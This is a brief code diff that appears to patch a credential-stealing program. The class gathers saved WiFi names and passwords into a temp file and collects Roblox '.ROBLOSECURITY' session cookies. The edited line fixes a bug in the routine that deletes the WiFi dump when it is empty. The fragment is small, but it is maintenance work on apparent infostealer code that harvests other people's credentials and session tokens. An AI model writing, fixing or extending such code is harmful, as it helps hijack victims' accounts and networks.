@@ -348,7 +348,7 @@ class main():
 				for i, j in self.name_pass.items():
 					f.write(f'Wifi Name: {i}\n Password: {j}\n\n')
 			f.close()
-			if open(os.path.join(self.tempfolder, "wifi.txt", 'r').read() == "": os.remove(os.path.join(self.tempfolder, f))
+			if open(os.path.join(self.tempfolder, "wifi.txt"), 'r').read() == "": os.remove(os.path.join(self.tempfolder, "wifi.txt"))
 
 	def writeRoblox(self):
 		res = [*set(self.roblosecurity)]
